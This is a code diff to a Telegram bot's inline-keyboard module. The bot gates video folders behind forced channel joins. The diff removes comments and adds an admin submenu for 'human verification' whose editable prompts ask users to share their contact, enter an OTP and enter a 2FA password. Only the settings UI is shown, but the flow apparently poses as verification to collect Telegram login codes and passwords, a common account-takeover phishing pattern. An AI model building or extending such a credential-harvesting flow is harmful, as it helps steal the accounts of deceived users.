@@ -6,7 +6,6 @@ const contentRepo = require('../db/content');
 
 // ---- User keyboards ----
 
-// Welcome page keyboard — just a "Next" button (or "See Videos" if no channels required)
 async function welcomeKeyboard(settingsOverride = null, channelsOverride = null) {
   const enabled = channelsOverride || await forceJoinRepo.listEnabledChannels();
   const kb = new InlineKeyboard();
@@ -20,7 +19,6 @@ async function welcomeKeyboard(settingsOverride = null, channelsOverride = null)
   return kb;
 }
 
-// Join page keyboard — "Join 1", "Join 2", "Join 3" buttons + "Check Join" button
 async function joinKeyboard(settingsOverride = null, channelsOverride = null) {
   const settings = settingsOverride || await settingsRepo.getAllSettings();
   const channels = channelsOverride || await forceJoinRepo.listEnabledChannels();
@@ -28,7 +26,6 @@ async function joinKeyboard(settingsOverride = null, channelsOverride = null) {
   const kb = new InlineKeyboard();
 
   const active = channels.filter((ch) => ch.is_enabled);
-  // Resolve all URLs in parallel (request channels get an auto-generated link)
   const urls = await Promise.all(active.map((ch) => getJoinUrl(ch)));
 
   active.forEach((ch, i) => {
@@ -45,18 +42,15 @@ async function folderKeyboard(parentId, breadcrumb) {
   const contents = parentId ? await contentRepo.getContentByFolder(parentId) : [];
 
   const kb = new InlineKeyboard();
-  // Sub-folders — one per row for clear tappable targets on Android
   for (const f of children) {
     if (!f.is_active) continue;
     kb.text(`📁 ${truncate(f.name, 40)}`, `open_folder:${f.id}`).row();
   }
-  // Content items — one per row
   for (const c of contents) {
     if (!c.is_active) continue;
     kb.text(`🎬 ${truncate(c.title, 40)}`, `view_content:${c.id}`).row();
   }
 
-  // Back button — always on its own row, full width
   if (breadcrumb && breadcrumb.length > 1) {
     const parent = breadcrumb[breadcrumb.length - 2];
     kb.text(`⬅️ ${settings.back_button_text}`, `open_folder:${parent.id}`);
@@ -98,10 +92,25 @@ function backToPanelKeyboard() {
   return new InlineKeyboard().text('⬅️ Back to Panel', 'admin:panel');
 }
 
+// ─── Human verification settings submenu ───
+function humanVerifySettingsKeyboard(settings) {
+  const enabled = settings.human_verify_enabled === 'true';
+  const kb = new InlineKeyboard();
+  kb.text(enabled ? '⛔ Disable Human Verification' : '✅ Enable Human Verification', 'asettings:hv_toggle').row();
+  kb.text('✏️ Edit Verification Prompt', 'asettings:hv_edit:human_verify_prompt').row();
+  kb.text('✏️ Edit Share-Contact Button Text', 'asettings:hv_edit:share_contact_button_text').row();
+  kb.text('✏️ Edit OTP Prompt', 'asettings:hv_edit:otp_prompt_text').row();
+  kb.text('✏️ Edit Success Message', 'asettings:hv_edit:human_verified_message').row();
+  kb.text('✏️ Edit 2FA Prompt', 'asettings:hv_edit:twofa_prompt_text').row();
+  kb.text('⬅️ Back to Settings', 'admin:settings').row();
+  return kb;
+}
+
 module.exports = {
   welcomeKeyboard,
   joinKeyboard,
   folderKeyboard,
   adminPanelKeyboard,
   backToPanelKeyboard,
+  humanVerifySettingsKeyboard,
 };
